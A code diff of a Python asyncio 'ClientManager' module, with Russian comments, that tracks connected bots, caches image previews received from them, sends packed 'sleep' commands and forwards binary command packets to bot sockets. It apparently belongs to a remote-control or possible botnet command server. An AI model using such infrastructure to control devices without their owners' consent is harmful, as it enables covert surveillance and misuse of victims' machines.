@@ -6,17 +6,26 @@ from typing import Any, Dict, List, Optional, Tuple
 import backend.LoggerWrapper as logger
 from .network import pack_packet
 
+# --- ХРАНИЛИЩА В ОПЕРАТИВНОЙ ПАМЯТИ ---
+
+# active_clients: Хранит активные сетевые сессии.
+# Ключ: bot_id (str), Значение: кортеж (asyncio.StreamReader, asyncio.StreamWriter)
 active_clients: Dict[str, Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = {}
+
+# preview_cache: Хранит последнее полученное превью для каждого бота.
+# Ключ: bot_id (str), Значение: сырые байты изображения (bytes)
+# Благодаря использованию словаря, старое превью автоматически удаляется из RAM 
+# при записи нового для того же bot_id.
 preview_cache: Dict[str, bytes] = {}
 
 
+# --- ФУНКЦИИ УПРАВЛЕНИЯ КЛИЕНТАМИ ---
+
 async def close_client(bot_identifier: str, send_sleep_command: bool = True) -> bool:
     """
-    Завершает сессию конкретного бота и закрывает сетевое соединение.
-    
-    Схема отключения:
-    [Command: sleep] -> [Close Socket] -> [Remove from active_clients]
+    Завершает сессию конкретного бота и очищает связанные с ним временные данные.
     """
+    # Извлекаем сессию из активных клиентов
     client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.pop(
         bot_identifier, 
         None
@@ -29,59 +38,61 @@ async def close_client(bot_identifier: str, send_sleep_command: bool = True) -> 
 
     try:
         if send_sleep_command:
-            writer.write(b"sleep\n")
+            # Отправляем пакет "усыпления" по стандарту V7.2 перед разрывом
+            # Модуль System:None, Payload 'sleep'
+            sleep_packet = pack_packet(bot_identifier, "System:None", "sleep")
+            writer.write(sleep_packet)
             await writer.drain()
         
+        # Закрываем соединение
         writer.close()
-        await writer.wait_closed()
-    except Exception:
-        pass
+        await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
+    except Exception as e:
+        logger.Log.debug(f"[ClientManager] Error during closing {bot_identifier}: {e}")
     finally:
-        logger.Log.info(f"[ClientManager] {bot_identifier} disconnected")
+        # Очищаем кэш превью при отключении бота, чтобы не тратить RAM на офлайн устройства
+        if bot_identifier in preview_cache:
+            del preview_cache[bot_identifier]
+            
+        logger.Log.info(f"[ClientManager] {bot_identifier} disconnected and resources cleared")
     
     return True
 
 
 async def close_all_clients() -> int:
     """
-    Выполняет массовое параллельное отключение всех активных ботов.
-    
-    Схема:
-    [List IDs] -> [asyncio.gather] -> [Return Count]
+    Массовое отключение всех активных ботов (например, при выключении сервера).
     """
     if not active_clients:
         return 0
 
     bot_identifiers: List[str] = list(active_clients.keys())
-    disconnection_tasks: List[Any] = [close_client(bot_id) for bot_id in bot_identifiers]
+    # Запускаем задачи параллельно для скорости
+    disconnection_tasks = [close_client(bot_id) for bot_id in bot_identifiers]
     
-    results: List[bool] = await asyncio.gather(*disconnection_tasks)
+    results = await asyncio.gather(*disconnection_tasks)
     
-    return len(results)
+    return len([res for res in results if res is True])
 
 
 def list_clients() -> List[Dict[str, str]]:
     """
-    Формирует список текущих онлайн-клиентов для API.
-    
-    Data Scheme:
-    [{"id": str, "status": "online"}, ...]
+    Возвращает список идентификаторов всех ботов, находящихся в сети.
     """
     return [{"id": bot_id, "status": "online"} for bot_id in active_clients]
 
 
 async def send_binary_to_bot(bot_identifier: str, binary_packet: bytes) -> bool:
     """
-    Транспортировка бинарного пакета до конечного сокета бота.
-    
-    Data Scheme:
-    [Binary Packet] -> transport.write() -> transport.drain()
+    Отправляет уже сформированный бинарный пакет напрямую в сокет бота.
+    Используется для команд из API или транзитных пакетов от админов.
     """
     client_session: Optional[Tuple[asyncio.StreamReader, asyncio.StreamWriter]] = active_clients.get(
         bot_identifier
     )
 
     if not client_session:
+        logger.Log.warning(f"[ClientManager] Attempted to send data to offline bot: {bot_identifier}")
         return False
 
     try:
@@ -91,4 +102,13 @@ async def send_binary_to_bot(bot_identifier: str, binary_packet: bytes) -> bool:
         return True
     except Exception as error:
         logger.Log.error(f"[ClientManager] Send error to {bot_identifier}: {error}")
+        # Если отправка не удалась, вероятно соединение мертво
+        asyncio.create_task(close_client(bot_identifier, send_sleep_command=False))
         return False
+
+
+def get_preview(bot_identifier: str) -> Optional[bytes]:
+    """
+    Получает последнее сохраненное превью из кэша.
+    """
+    return preview_cache.get(bot_identifier)
